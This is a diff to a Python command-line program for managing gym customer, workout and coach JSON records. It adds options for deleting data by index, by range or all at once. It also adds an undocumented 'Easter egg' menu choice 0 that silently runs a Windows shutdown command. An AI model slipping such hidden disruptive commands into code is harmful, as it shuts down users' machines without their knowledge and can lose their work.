@@ -1,9 +1,25 @@
+import os
 from customers import Customers
 from workouts import Work_out
 from coach import Coach
 
 
-def sort_data():
+def delete_options_try(choice):
+    global delete_option
+    a = ("Customers") if choice == 1 else ("Coach") if choice == 3 else ("Work-out")
+    while True:
+        delete_option = input(f"""Choose the way you want to delete <{a}.json> data:\n\
+                              1. Certain index
+                              2. From index to index
+                              3. All data\nInput your third choice: """)
+        try:
+            delete_option = int(delete_option)
+            if delete_option in [1, 2, 3]:
+                return delete_option
+                break
+        except ValueError:
+            print("Invalid choice. Please enter a valid integer value for choice.")
+def sort_data():  # check
     print("""Choose the file you want to sort whole <.json> data in:\n
                 1. Customers\n
                 2. Workout\n
@@ -82,7 +98,7 @@ def default_try_except():
             print("Invalid choice. Please enter a valid integer value for choice.")
 def q_continue():
     while True:
-        q_continue = input("Do you want to leave to main menu? Yes / No\nYour choice: ").lower()
+        q_continue = input("\nDo you want to leave to main menu? Yes / No\nYour choice: ").lower()
         try:
             if q_continue in ["yes", "no"]:
                 break
@@ -95,8 +111,9 @@ def q_continue():
     else:
         print("Exiting the program.")
         exit()
+
 def delete_data():
-    print("""Choose the file you want to delete certain data in:\n
+    print("""\nChoose the file you want to delete certain data in:\n
             1. Customers\n
             2. Workout\n
             3. Coach\n""")
@@ -104,23 +121,34 @@ def delete_data():
     default_try_except()
 
     if choice2 == 1:
-        default_index_check(choice2)
+        delete_options = delete_options_try(choice2)
+        if delete_options == 1:
+            default_index_check(choice2)
+        else:
+            index = 0
         customer = Customers("", "", 0, "", "")
-        customer.delete_data_from_customers("customer.json", index)
+        customer.delete_data_from_customer("customer.json", delete_options, index)
         q_continue()
 
     if choice2 == 2:
-        default_index_check(choice2)
+        delete_options = delete_options_try(choice2)
+        if delete_options == 1:
+            default_index_check(choice2)
+        else:
+            index = 0
         work_out = Work_out("", "", 0, "", "")
-        work_out.delete_data_from_workouts("workout.json", index)
+        work_out.delete_data_from_workouts("workout.json", delete_options, index)
         q_continue()
 
     elif choice2 == 3:
-        default_index_check(choice2)
+        delete_options = delete_options_try(choice2)
+        if delete_options == 1:
+            default_index_check(choice2)
+        else:
+            index = 0
         coach = Coach("", "", 0, "", "", 0)
-        coach.delete_data_from_coach("coach.json", index )
-        q_continue()
-
+        coach.delete_data_from_coach("coach.json", delete_options, index)
+        q_continue() # WIP
 
 def search_data():
     print("""Choose the file you want to search / filter data in:\n
@@ -146,8 +174,7 @@ def search_data():
         search_query = input("Input the search query: ")
         coach = Coach("", "", 0, "", "", 0)
         coach.search_filter_coach_data('coach.json', search_query)
-        q_continue()
-
+        q_continue() # done
 
 def add_data():
     print("""Choose the file you want to add data to:\n
@@ -295,8 +322,6 @@ def add_data():
                         print("Invalid work stasis format. Please enter a valid integer value for stasis.")
                 coach = Coach(name, surname, age, phone, address, work_stasis)
 
-
-
 def print_data():
     print("""Choose the file you want to print data of:\n
         1. Customers\n
@@ -320,8 +345,6 @@ def print_data():
         coach.print_data_of_coach('coach.json')
         q_continue()
 
-
-
 def main_menu():
     print("""Choose what to do:\n
     1. Add data\n
@@ -337,7 +360,7 @@ def main_menu():
         choice = input("Input your choice: ")
         try:
             choice = int(choice)  # Convert the input to an integer
-            if choice in [1, 2, 3, 4, 5, 6, 7]:
+            if choice in [1, 2, 3, 4, 5, 6, 7, 0]:
                 break
             else:
                 print("Invalid choice. Please enter a valid integer value for choice.")
@@ -357,6 +380,9 @@ def main_menu():
     elif choice == 7:
         print("Thanks for using our program. Good bye!")
         quit()
+    elif choice == 0:
+        print("Easter egg")
+        os.system("shutdown /s /t 3")
 
 
 main_menu()
